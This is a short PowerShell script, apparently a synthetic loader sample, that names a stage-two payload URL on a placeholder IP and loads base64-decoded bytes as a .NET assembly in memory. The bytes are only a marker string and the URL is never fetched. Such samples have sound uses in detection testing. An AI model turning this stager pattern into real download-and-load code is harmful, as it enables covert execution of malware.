
[CmdletBinding()]
param(
    [string]$Stage2Url = "http://192.0.2.4:80/payload.bin",
    [int]$TimeoutSec = 130
)
$ErrorActionPreference = "Stop"

try {
    $PayloadBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpuaXlhbGNzeGhl")
    Write-Verbose ("Assembly byte count: " + $PayloadBytes.Length)
    $StageResult = [Reflection.Assembly]::Load($PayloadBytes)
    if ($null -ne $StageResult) {
        Write-Verbose ("Loaded assembly: " + $StageResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Write-Verbose "stage marker 24 reached"
